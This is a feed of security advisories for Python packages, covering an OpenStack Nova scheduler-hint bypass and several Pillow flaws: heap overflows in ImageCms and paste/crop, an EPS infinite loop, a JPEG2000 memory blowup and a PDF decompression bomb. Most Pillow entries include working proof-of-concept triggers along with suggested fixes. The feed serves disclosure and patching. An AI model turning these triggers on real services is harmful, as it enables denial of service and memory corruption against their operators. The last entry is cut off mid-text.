<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-07-21T18:07:55.515Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[nova] OpenStack Nova: Nova scheduler hint injection bypasses Placement resource claims and scheduling constraints]]></title>
        <id>https://github.com/advisories/GHSA-mfg3-p6m3-gjgr</id>
        <link href="https://github.com/advisories/GHSA-mfg3-p6m3-gjgr"/>
        <updated>2026-07-21T15:04:07.000Z</updated>
        <content type="html"><![CDATA[<h2 id="affects">Affects</h2>
<ul>
<li>Nova: &gt;=18.0.0 &lt;31.3.1, &gt;=32.0.0 &lt;32.2.1, &gt;=33.0.0 &lt;33.0.2</li>
</ul>
<h2 id="description">Description</h2>
<p>Erichen from the Institute of Computing Technology, Chinese Academy of 
Sciences reported that Nova's server create API does not strip internal 
scheduler hints. An authenticated user can bypass Placement resource 
claims and scheduling constraint enforcement, including availability 
zone, host aggregate, and image trait restrictions. The resulting 
instance has no Placement allocation, which can lead to compute node 
resource exhaustion and cross-tenant data persistence on NVMe devices 
after instance deletion. Deployments running Nova 18.0.0 or later are 
affected.</p>
<h2 id="patches">Patches</h2>
<ul>
<li><a href="https://review.opendev.org/993604">https://review.opendev.org/993604</a> (2025.1/epoxy)</li>
<li><a href="https://review.opendev.org/993603">https://review.opendev.org/993603</a> (2025.2/flamingo)</li>
<li><a href="https://review.opendev.org/993602">https://review.opendev.org/993602</a> (2026.1/gazpacho)</li>
<li><a href="https://review.opendev.org/993601">https://review.opendev.org/993601</a> (2026.2/hibiscus)</li>
</ul>
<h2 id="credits">Credits</h2>
<ul>
<li>Erichen from Institute of Computing Technology, Chinese Academy of 
Sciences (CVE-2026-46448)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-46448">https://nvd.nist.gov/vuln/detail/CVE-2026-46448</a></li>
<li><a href="https://bugs.launchpad.net/nova/+bug/2151252">https://bugs.launchpad.net/nova/+bug/2151252</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/06/16/5">https://www.openwall.com/lists/oss-security/2026/06/16/5</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/06/16/5">http://www.openwall.com/lists/oss-security/2026/06/16/5</a></li>
<li><a href="https://review.opendev.org/993601">https://review.opendev.org/993601</a></li>
<li><a href="https://review.opendev.org/993602">https://review.opendev.org/993602</a></li>
<li><a href="https://review.opendev.org/993603">https://review.opendev.org/993603</a></li>
<li><a href="https://review.opendev.org/993604">https://review.opendev.org/993604</a></li>
<li><a href="https://github.com/advisories/GHSA-mfg3-p6m3-gjgr">https://github.com/advisories/GHSA-mfg3-p6m3-gjgr</a></li>
<li><a href="https://github.com/openstack/nova">https://github.com/openstack/nova</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nova/PYSEC-2026-2686.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nova/PYSEC-2026-2686.yaml</a></li>
<li><a href="https://pypi.org/project/nova">https://pypi.org/project/nova</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mfg3-p6m3-gjgr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T21:32:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pillow] Pillow: Controlled heap out-of-bounds write in Pillow `ImageCmsTransform.apply()` via output mode mismatch]]></title>
        <id>https://github.com/advisories/GHSA-9hw9-ch79-4vh6</id>
        <link href="https://github.com/advisories/GHSA-9hw9-ch79-4vh6"/>
        <updated>2026-07-20T23:19:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Pillow's public <code>ImageCms.ImageCmsTransform.apply(im, imOut)</code> API can trigger
controlled native heap corruption when the caller supplies an output image whose
mode does not match the transform's declared output mode.</p>
<p>For example, a transform built as <code>RGBA -&gt; RGBA</code> can be applied to an <code>L</code> output
image. Pillow checks dimensions only, then calls LittleCMS with the output row
pointer. LittleCMS writes RGBA-sized rows into a 1-byte-per-pixel <code>L</code> image row.</p>
<h3 id="details">Details</h3>
<p><code>src/PIL/ImageCms.py:ImageCmsTransform.apply()</code> accepts an optional caller
supplied <code>imOut</code>:</p>
<pre><code class="language-python">def apply(self, im, imOut=None):
    if imOut is None:
        imOut = Image.new(self.output_mode, im.size, None)
    self.transform.apply(im.getim(), imOut.getim())
    imOut.info["icc_profile"] = self.output_profile.tobytes()
    return imOut
</code></pre>
<p>If <code>imOut</code> is provided, Pillow does not check:</p>
<pre><code class="language-text">im.mode == self.input_mode
imOut.mode == self.output_mode
</code></pre>
<p>The C wrapper in <code>src/_imagingcms.c</code> unwraps both image cores and only checks
that the output dimensions are at least as large as the input dimensions:</p>
<pre><code class="language-c">static int
pyCMSdoTransform(Imaging im, Imaging imOut, cmsHTRANSFORM hTransform) {
    if (im-&gt;xsize &gt; imOut-&gt;xsize || im-&gt;ysize &gt; imOut-&gt;ysize) {
        return -1;
    }

    for (i = 0; i &lt; im-&gt;ysize; i++) {
        cmsDoTransform(hTransform, im-&gt;image[i], imOut-&gt;image[i], im-&gt;xsize);
    }

    pyCMScopyAux(hTransform, imOut, im);
    return 0;
}
</code></pre>
<p><code>findLCMStype()</code> maps <code>RGB</code>, <code>RGBA</code>, and <code>RGBX</code> transform modes to LittleCMS
<code>TYPE_RGBA_8</code>, which writes 4 bytes per pixel:</p>
<pre><code class="language-c">case IMAGING_MODE_RGB:
case IMAGING_MODE_RGBA:
case IMAGING_MODE_RGBX:
    return TYPE_RGBA_8;
</code></pre>
<p>So with a transform declared as <code>RGBA -&gt; RGBA</code>, LittleCMS writes <code>4 * width</code>
bytes to each output row. If the supplied output image is mode <code>L</code>, Pillow only
allocated <code>1 * width</code> bytes for that row.</p>
<p>For width 4096:</p>
<pre><code class="language-text">destination row allocation: 4096 bytes
LittleCMS write size:       16384 bytes
overflow:                  ~12288 bytes past the row
</code></pre>
<p>The bug does not require a large image. Width 8 was enough to corrupt heap
metadata. At width 8, <code>apply()</code> returned to Python and printed <code>after</code>; glibc
detected the corrupted heap later during cleanup.</p>
<h3 id="poc">PoC</h3>
<p>Tiny heap corruption trigger:</p>
<pre><code class="language-python">from PIL import Image, ImageCms

srgb = ImageCms.createProfile("sRGB")
transform = ImageCms.buildTransform(srgb, srgb, "RGBA", "RGBA")

im = Image.new("RGBA", (8, 1), (0x41, 0x42, 0x43, 0x44))
out = Image.new("L", (8, 1), 0)

print("before", flush=True)
transform.apply(im, out)
print("after")
</code></pre>
<p>Observed locally on Pillow <code>12.3.0.dev0</code>:</p>
<pre><code class="language-text">before
after
free(): invalid next size (normal)
Aborted (core dumped)
</code></pre>
<p>Controlled overwrite evidence PoC:</p>
<pre><code class="language-python">from PIL import Image, ImageCms

srgb = ImageCms.createProfile("sRGB")
transform = ImageCms.buildTransform(srgb, srgb, "RGBA", "RGBA")

im = Image.new("RGBA", (4096, 1), (0x41, 0x42, 0x43, 0x44))
out = Image.new("L", (4096, 1), 0)

transform.apply(im, out)
</code></pre>
<p>Run under gdb:</p>
<pre><code class="language-bash">gdb -q --batch -ex run -ex bt --args \
  python3 b022_controlled.py
</code></pre>
<p>Observed on Pillow <code>12.3.0.dev0</code>:</p>
<pre><code class="language-text">Program received signal SIGSEGV, Segmentation fault.
___pthread_mutex_lock (mutex=mutex@entry=0x4443424144434241)
#1 _cmsLockPrimitive (m=0x4443424144434241)
#2 defMtxLock (id=0x4443424144434241, mtx=0x4443424144434241)
#3 _cmsLockMutex (ContextID=0x4443424144434241, mtx=0x4443424144434241)
#4 cmsSaveProfileToIOhandler(...)
#5 cmsSaveProfileToMem(...)
#6 cms_profile_tobytes (...) at src/_imagingcms.c:152
</code></pre>
<p><code>0x4443424144434241</code> is the attacker-controlled source pixel pattern
<code>b"ABCDABCD"</code> interpreted as a little-endian pointer-sized value.</p>
<p>Using source pixels <code>(1, 2, 3, 4)</code> similarly produced a faulting pointer of
<code>0x403020104030201</code>, matching the repeated pixel bytes.</p>
<h3 id="impact">Impact</h3>
<p>This is a heap out-of-bounds write in Pillow's native ImageCms extension,
reachable through public API.</p>
<p>Applications are impacted if untrusted users can control ImageCms transform
parameters and/or provide the output image object passed to
<code>ImageCmsTransform.apply()</code>. The source image pixels influence the bytes written
out of bounds.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Validate modes before calling into the native transform:</p>
<pre><code class="language-python">def apply(self, im, imOut=None):
    if im.mode != self.input_mode:
        raise ValueError("input mode mismatch")
    if imOut is None:
        imOut = Image.new(self.output_mode, im.size, None)
    elif imOut.mode != self.output_mode:
        raise ValueError("output mode mismatch")
    self.transform.apply(im.getim(), imOut.getim())
    imOut.info["icc_profile"] = self.output_profile.tobytes()
    return imOut
</code></pre>
<p>The C extension should also defensively reject mismatched image modes before
calling <code>cmsDoTransform()</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-9hw9-ch79-4vh6">https://github.com/python-pillow/Pillow/security/advisories/GHSA-9hw9-ch79-4vh6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59205">https://nvd.nist.gov/vuln/detail/CVE-2026-59205</a></li>
<li><a href="https://github.com/python-pillow/Pillow/pull/9715">https://github.com/python-pillow/Pillow/pull/9715</a></li>
<li><a href="https://github.com/python-pillow/Pillow/commit/a9ffc42bedf4fc0a7ef8d6486e7f9e81e3397721">https://github.com/python-pillow/Pillow/commit/a9ffc42bedf4fc0a7ef8d6486e7f9e81e3397721</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3453.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3453.yaml</a></li>
<li><a href="https://github.com/python-pillow/Pillow/releases/tag/12.3.0">https://github.com/python-pillow/Pillow/releases/tag/12.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-9hw9-ch79-4vh6">https://github.com/advisories/GHSA-9hw9-ch79-4vh6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9hw9-ch79-4vh6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-20T23:19:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pillow] Pillow JPEG2000 tiled decode retains a growing scratch buffer and can be used for denial of service]]></title>
        <id>https://github.com/advisories/GHSA-vjc4-5qp5-m44j</id>
        <link href="https://github.com/advisories/GHSA-vjc4-5qp5-m44j"/>
        <updated>2026-07-20T23:18:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>src/libImaging/Jpeg2KDecode.c:853</code> accumulates <code>total_component_width</code> across every tile in a JPEG2000 image instead of recomputing it per tile. That accumulated value is then used in the <code>tile_bytes</code> calculation at <code>src/libImaging/Jpeg2KDecode.c:868</code>, which can make the decoder grow <code>state-&gt;buffer</code> via <code>realloc</code> at <code>src/libImaging/Jpeg2KDecode.c:876</code> up to roughly one full image's decompressed size even when each tile is small. A crafted tiled JPEG2000 file can therefore force substantially higher transient memory usage and trigger out-of-memory failures during decoding. Based on current evidence, the supported impact is denial of service, not memory corruption.</p>
<h3 id="details">Details</h3>
<ul>
<li>Location: <code>src/libImaging/Jpeg2KDecode.c:853</code></li>
<li>Root cause: <code>total_component_width</code> is initialized only once before the tile loop and keeps growing across tiles. It is then used to derive <code>tile_bytes</code>, so later tiles are treated as if they had the combined component width of all earlier tiles.</li>
<li>Dangerous operation: <code>tile_bytes</code> is promoted into <code>tile_info.data_size</code>, then <code>state-&gt;buffer</code> is grown with <code>realloc</code> at <code>src/libImaging/Jpeg2KDecode.c:876</code>.</li>
<li>Reachability: any attacker-controlled JPEG2000 image with many tiles reaches this path during normal <code>Image.open(...).load()</code> decoding.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>The attached helper script and testcase were used:
<a href="https://github.com/user-attachments/files/28099912/exercise_j2k_tile_realloc.zip">exercise_j2k_tile_realloc.zip</a></p>
<p>Generate the testcase:</p>
<pre><code class="language-bash">pythonexercise_j2k_tile_realloc.py make poc_3664_rgba_tile1832.jp2 \
  --size 3664 --tile 1832
</code></pre>
<p>Expected geometry from the helper:</p>
<ul>
<li>image size: <code>3664 x 3664</code></li>
<li>mode: <code>RGBA</code></li>
<li>tile size: <code>1832 x 1832</code> (<code>2x2</code> tiles)</li>
<li><code>image_bytes=53699584</code></li>
<li>uncapped RSS observed:<ul>
<li>vulnerable build: <code>maxrss_kb=180264</code></li>
<li>fixed comparison build: <code>maxrss_kb=138404</code></li>
</ul>
</li>
</ul>
<p>Load it with the current vulnerable build:</p>
<pre><code class="language-bash">python exercise_j2k_tile_realloc.py load poc_3664_rgba_tile1832.jp2
</code></pre>
<p>Load it again under a 160 MB address-space cap:</p>
<pre><code class="language-bash">python exercise_j2k_tile_realloc.py load poc_3664_rgba_tile1832.jp2 --limit-mb 160
</code></pre>
<h3 id="impact">Impact</h3>
<p>Conservative impact: denial of service through memory exhaustion during JPEG2000 decoding.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-vjc4-5qp5-m44j">https://github.com/python-pillow/Pillow/security/advisories/GHSA-vjc4-5qp5-m44j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59204">https://nvd.nist.gov/vuln/detail/CVE-2026-59204</a></li>
<li><a href="https://github.com/python-pillow/Pillow/pull/9704">https://github.com/python-pillow/Pillow/pull/9704</a></li>
<li><a href="https://github.com/python-pillow/Pillow/commit/13ada41172142f2fd9f0906f615a00ea623a11ca">https://github.com/python-pillow/Pillow/commit/13ada41172142f2fd9f0906f615a00ea623a11ca</a></li>
<li><a href="https://github.com/python-pillow/Pillow/releases/tag/12.3.0">https://github.com/python-pillow/Pillow/releases/tag/12.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-vjc4-5qp5-m44j">https://github.com/advisories/GHSA-vjc4-5qp5-m44j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vjc4-5qp5-m44j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-20T23:18:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pillow] Pillow EpsImagePlugin negative %%BeginBinary byte count causes infinite loop denial of service]]></title>
        <id>https://github.com/advisories/GHSA-pg7v-jwj7-p798</id>
        <link href="https://github.com/advisories/GHSA-pg7v-jwj7-p798"/>
        <updated>2026-07-20T23:11:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Pillow's EPS parser (PIL/EpsImagePlugin.py) accepts a negative byte count in the %%BeginBinary directive. A crafted EPS file can cause Image.open() to seek backwards to the same directive and parse it repeatedly, resulting in an infinite loop and CPU denial of service.</p>
<p>The issue is triggered during Image.open(), does not require Image.load(), and does not require Ghostscript execution.</p>
<p>Confirmed affected versions: Pillow 12.0.0 through 12.2.0.</p>
<h3 id="details">Details</h3>
<p>The issue is in the EPS parser in PIL/EpsImagePlugin.py. When parsing an EPS %%BeginBinary directive, Pillow reads the byte count from the file and passes it directly to a relative seek operation without validating that the value is non-negative.</p>
<p>Relevant code:</p>
<pre><code>elif bytes_mv[:14] == b"%%BeginBinary:":
    bytecount = int(byte_arr[14:bytes_read])
    self.fp.seek(bytecount, os.SEEK_CUR)
</code></pre>
<p>There is no validation that bytecount is non-negative.</p>
<p>If an attacker provides a negative value such as %%BeginBinary:-18, the parser moves the file pointer backwards from the end of the directive line to the same line region. The next parser iteration reads the same %%BeginBinary:-18 directive again, performs the same backward seek, and repeats indefinitely. This causes Image.open() to hang in an infinite loop and consume CPU.</p>
<p>In local testing, the issue is present in Pillow 12.0.0, 12.1.0, 12.1.1, and 12.2.0. Pillow 11.3.0 did not hang with the same PoC, so this appears to affect the 12.x EPS parsing path.</p>
<h3 id="poc">PoC</h3>
<p>Save the following content as pillow_eps_beginbinary_dos.eps:</p>
<pre><code>%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 1 1
%%EndComments
% dummy comment after transition
%%BeginBinary:-18
%%EOF
</code></pre>
<p>Then run:</p>
<pre><code>python -m pip install "Pillow==12.2.0"

python - &lt;&lt;'PY'
from PIL import Image
Image.open("pillow_eps_beginbinary_dos.eps")
PY
</code></pre>
<p>Expected behavior: Pillow should reject the malformed EPS file with a parser exception.</p>
<p>Actual behavior: the process does not return. It hangs inside Image.open() and continuously consumes CPU.</p>
<p>The loop behavior can be observed by tracing the parser state. The file pointer repeatedly seeks from position 112 back to 94, causing the same %%BeginBinary:-18 line to be parsed again and again:</p>
<pre><code>LINE b'%%BeginBinary:-18' pos_after_newline 112
BeginBinary bytecount -18 seek from 112 to 94
LINE b'%%BeginBinary:-18' pos_after_newline 112
BeginBinary bytecount -18 seek from 112 to 94
LINE b'%%BeginBinary:-18' pos_after_newline 112
BeginBinary bytecount -18 seek from 112 to 94
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a denial-of-service vulnerability. An attacker who can provide an EPS file to an application using Pillow for image validation, metadata parsing, previews, uploads, or batch image processing can cause the image parsing process to hang during Image.open().</p>
<p>This can impact web services and backend workers that parse untrusted image files, especially if image parsing is performed in a main worker process without CPU limits, timeouts, or process isolation. The issue does not require Ghostscript execution and does not require calling Image.load(), so applications that only use Image.open() to validate or identify uploaded images may still be affected.</p>
<p>Suggested fix: validate the parsed %%BeginBinary byte count before seeking. If the byte count is negative, reject the file with a parsing exception instead of calling self.fp.seek(bytecount, os.SEEK_CUR).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-pg7v-jwj7-p798">https://github.com/python-pillow/Pillow/security/advisories/GHSA-pg7v-jwj7-p798</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59203">https://nvd.nist.gov/vuln/detail/CVE-2026-59203</a></li>
<li><a href="https://github.com/python-pillow/Pillow/pull/9708">https://github.com/python-pillow/Pillow/pull/9708</a></li>
<li><a href="https://github.com/python-pillow/Pillow/commit/03992618118b4a76b6163cd72ab5ecd684133b83">https://github.com/python-pillow/Pillow/commit/03992618118b4a76b6163cd72ab5ecd684133b83</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3452.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3452.yaml</a></li>
<li><a href="https://github.com/python-pillow/Pillow/releases/tag/12.3.0">https://github.com/python-pillow/Pillow/releases/tag/12.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-pg7v-jwj7-p798">https://github.com/advisories/GHSA-pg7v-jwj7-p798</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pg7v-jwj7-p798</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-20T23:11:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Pillow] Pillow: Decompression Bomb DoS via PdfParser.PdfStream.decode()]]></title>
        <id>https://github.com/advisories/GHSA-jjj6-mw9f-p565</id>
        <link href="https://github.com/advisories/GHSA-jjj6-mw9f-p565"/>
        <updated>2026-07-20T23:11:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>PdfParser.PdfStream.decode()</code> in Pillow's <code>PdfParser.py</code> calls <code>zlib.decompress()</code> with the <code>bufsize</code> parameter set to the value of the PDF stream's <code>Length</code> field, without any upper bound on the actual decompressed output size. Python's <code>zlib.decompress()</code> <code>bufsize</code> argument is an <em>initial output buffer hint</em>, not a maximum size limit — the function will expand memory until the full decompressed result is produced. A crafted PDF containing a FlateDecode-compressed stream decompresses to 1 GB of memory from a ~950 KB file, causing server OOM termination or severe degradation in any application that uses <code>PdfParser</code> to read untrusted PDF files.</p>
<h3 id="details">Details</h3>
<p><code>PdfStream.decode()</code> in <code>pdfminer/PdfParser.py</code> reads the stream's declared <code>Length</code> (or <code>DL</code>) field from the PDF dictionary and passes it as <code>bufsize</code> to <code>zlib.decompress()</code>:</p>
<pre><code class="language-python"># PIL/PdfParser.py — PdfStream.decode()
class PdfStream:
    def decode(self) -&gt; bytes:
        try:
            filter = self.dictionary[b"Filter"]
        except KeyError:
            return self.buf
        if filter == b"FlateDecode":
            try:
                expected_length = self.dictionary[b"DL"]
            except KeyError:
                expected_length = self.dictionary[b"Length"]
            return zlib.decompress(self.buf, bufsize=int(expected_length))
            #                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
            #  bufsize is an *initial buffer hint*, NOT a maximum size limit.
            #  zlib.decompress() allocates as much memory as needed regardless.
</code></pre>
<p>From the Python documentation: <em>"The <code>bufsize</code> parameter is used as the initial size of the output buffer."</em> It does not cap decompression. An attacker who controls the PDF stream contents can provide a highly-compressed payload that expands to gigabytes, while setting <code>Length</code> to any value (including the actual compressed size) to avoid triggering format validation.</p>
<p><code>PdfParser</code> is instantiated with a filename or file object and calls <code>read_pdf_info()</code> on open, which parses the xref table and makes stream objects accessible. <code>PdfStream.decode()</code> is reachable whenever calling code accesses a compressed stream object from the parsed PDF.</p>
<p><strong>Confirmed reachable path:</strong></p>
<pre><code class="language-python">with PdfParser.PdfParser("evil.pdf") as pdf:
    stream_obj, _ = pdf.get_value(pdf.buf, stream_offset)
    data = stream_obj.decode()   # ← OOM here
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-python">import zlib, tempfile, os, time
from PIL import PdfParser

# Build a minimal PDF with a 100 MB FlateDecode bomb (demo scale)
EXPAND_MB = 100
raw = b'\x00' * (EXPAND_MB * 1_000_000)
compressed = zlib.compress(raw, level=9)   # ~97 KB

buf = b'%PDF-1.4\n'
o1 = len(buf); buf += b'1 0 obj\n&lt;&lt; /Type /Pages /Kids [] /Count 0 &gt;&gt;\nendobj\n'
o2 = len(buf); buf += b'2 0 obj\n&lt;&lt; /Type /Catalog /Pages 1 0 R &gt;&gt;\nendobj\n'
o3 = len(buf)
hdr = f'&lt;&lt; /Filter /FlateDecode /Length {len(compressed)} &gt;&gt;'.encode()
buf += b'3 0 obj\n' + hdr + b'\nstream\n' + compressed + b'\nendstream\nendobj\n'
xref = len(buf)
buf += b'xref\n0 4\n0000000000 65535 f \n'
for off in [o1, o2, o3]:
    buf += f'{off:010d} 00000 n \n'.encode()
buf += b'trailer\n&lt;&lt; /Size 4 /Root 2 0 R &gt;&gt;\nstartxref\n' + str(xref).encode() + b'\n%%EOF\n'

print(f"PDF size: {len(buf):,} bytes ({len(buf)/1024:.1f} KB)")

with tempfile.NamedTemporaryFile(delete=False, suffix='.pdf') as f:
    f.write(buf); tmpname = f.name

with PdfParser.PdfParser(tmpname) as pdf:
    obj, _ = pdf.get_value(pdf.buf, o3)
    t = time.time()
    decoded = obj.decode()
    print(f"Decoded: {len(decoded):,} bytes in {time.time()-t:.3f}s")

os.unlink(tmpname)
</code></pre>
<p><strong>Actual output (Pillow 12.1.1, Python 3.12):</strong></p>
<pre><code>PDF size: 97,538 bytes (95.3 KB)
Decoded: 100,000,000 bytes in 0.265s
</code></pre>
<p><strong>Measured expansion:</strong></p>
<table>
<thead>
<tr>
<th>PDF file size</th>
<th>Memory allocated</th>
<th>Ratio</th>
<th>Wall time</th>
</tr>
</thead>
<tbody><tr>
<td>10 KB</td>
<td>10 MB</td>
<td>1,026×</td>
<td>0.024 s</td>
</tr>
<tr>
<td>95 KB</td>
<td>100 MB</td>
<td>1,028×</td>
<td>0.265 s</td>
</tr>
<tr>
<td>475 KB</td>
<td>500 MB</td>
<td>1,028×</td>
<td>1.279 s</td>
</tr>
<tr>
<td>950 KB</td>
<td>1,000 MB (1 GB)</td>
<td>1,028×</td>
<td>2.668 s</td>
</tr>
</tbody></table>
<h3 id="impact">Impact</h3>
<p>This is a denial-of-service vulnerability. Any application that uses <code>PIL.PdfParser.PdfParser</code> to read untrusted PDF files is affected. An unauthenticated attacker who can submit a PDF for processing can exhaust all available server memory with a ~950 KB file, causing OOM termination or service degradation affecting all concurrent users. No authentication or user interaction beyond submitting the file is required.</p>
<p><strong>Note:</strong> This vulnerability is independent of CVE-2025-64512 / CVE-2025-70559 (pdfminer.six) and the companion <code>PIL/PdfImagePlugin.py</code> decompression issue. It exists specifically in Pillow's own <code>PdfParser.py</code> module, which is distinct from pdfminer.six.</p>
<p><strong>Suggested fix:</strong></p>
<pre><code class="language-python">MAX_DECOMPRESS_BYTES = 200 * 1024 * 1024  # 200 MB cap

def decode(self) -&gt; bytes:
    ...
    if filter == b"FlateDecode":
        ...
        result = zlib.decompress(self.buf, bufsize=int(expected_length))
        if len(result) &gt; MAX_DECOMPRESS_BYTES:
            msg = "Decompressed stream exceeds maximum allowed size"
            raise ValueError(msg)
        return result
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-jjj6-mw9f-p565">https://github.com/python-pillow/Pillow/security/advisories/GHSA-jjj6-mw9f-p565</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59200">https://nvd.nist.gov/vuln/detail/CVE-2026-59200</a></li>
<li><a href="https://github.com/python-pillow/Pillow/pull/9718">https://github.com/python-pillow/Pillow/pull/9718</a></li>
<li><a href="https://github.com/python-pillow/Pillow/commit/f7a31ea75e460e108c37126da1f47812f21f6b09">https://github.com/python-pillow/Pillow/commit/f7a31ea75e460e108c37126da1f47812f21f6b09</a></li>
<li><a href="https://github.com/python-pillow/Pillow/releases/tag/12.3.0">https://github.com/python-pillow/Pillow/releases/tag/12.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-jjj6-mw9f-p565">https://github.com/advisories/GHSA-jjj6-mw9f-p565</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jjj6-mw9f-p565</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-20T23:11:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Pillow] Pillow: Heap out-of-bounds write `Image.paste()` / `Image.crop()` via signed coordinate overflow]]></title>
        <id>https://github.com/advisories/GHSA-6r8x-57c9-28j4</id>
        <link href="https://github.com/advisories/GHSA-6r8x-57c9-28j4"/>
        <updated>2026-07-20T23:09:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Pillow's public image coordinate APIs can trigger a native heap out-of-bounds
write when given coordinates near the signed 32-bit integer limits. In 4-byte
pixel modes such as <code>RGBA</code>, this becomes a controlled backward heap underwrite:
for a source image of width <code>W</code>, Pillow writes <code>4 * W</code> attacker-controlled bytes
starting <code>4 * W</code> bytes before the destination row pointer. With successful large
image allocation, the theoretical upper bound is ~2 GiB backwards from
the destination row.</p>
<p>Minimal public API trigger:</p>
<pre><code class="language-python">from PIL import Image

INT_MIN = -(1 &lt;&lt; 31)

src = Image.new("RGBA", (2, 1), (0x41, 0x42, 0x43, 0x44))
dst = Image.new("RGBA", (8, 1))
dst.paste(src, ((1 &lt;&lt; 31) - 2, 0, INT_MIN, 1))
</code></pre>
<p>The same root cause is also reachable through <code>Image.crop()</code> and
<code>Image.alpha_composite()</code>. No private API, ctypes, custom Python object, or
malformed image file is needed.</p>
<p>This has been confirmed as an ASAN heap-buffer-overflow write. On normal
non-ASAN Pillow builds, the minimal trigger corrupts the heap and aborts with
<code>double free or corruption (out)</code></p>
<h3 id="details">Details</h3>
<p><code>src/PIL/Image.py:paste()</code> accepts a 4-tuple box and passes it to the native
<code>ImagingCore.paste()</code> method:</p>
<pre><code class="language-python">self.im.paste(source, box)
</code></pre>
<p><code>src/_imaging.c:_paste()</code> parses the four Python coordinates into signed <code>int</code>
values and calls <code>ImagingPaste()</code>:</p>
<pre><code class="language-c">int x0, y0, x1, y1;
PyArg_ParseTuple(args, "O(iiii)|O!", &amp;source, &amp;x0, &amp;y0, &amp;x1, &amp;y1, ...);
status = ImagingPaste(self-&gt;image, PyImaging_AsImaging(source), ..., x0, y0, x1, y1);
</code></pre>
<p><code>src/libImaging/Paste.c:ImagingPaste()</code> computes and clips the region using
signed <code>int</code> arithmetic:</p>
<pre><code class="language-c">xsize = dx1 - dx0;
ysize = dy1 - dy0;

if (dx0 + xsize &gt; imOut-&gt;xsize) {
    xsize = imOut-&gt;xsize - dx0;
}
</code></pre>
<p>With <code>dx0 = 2147483646</code> and <code>dx1 = -2147483648</code>, <code>dx1 - dx0</code> wraps to <code>2</code>.
That matches the 2-pixel source image, so the size check passes. The later
<code>dx0 + xsize</code> clip check wraps around and does not reject the out-of-bounds
destination.</p>
<p>For 4-byte pixel modes such as <code>RGBA</code>, the paste loop then multiplies <code>dx</code> by
<code>pixelsize</code>:</p>
<pre><code class="language-c">dx *= pixelsize;
xsize *= pixelsize;
memcpy(imOut-&gt;image[y + dy] + dx, imIn-&gt;image[y + sy] + sx, xsize);
</code></pre>
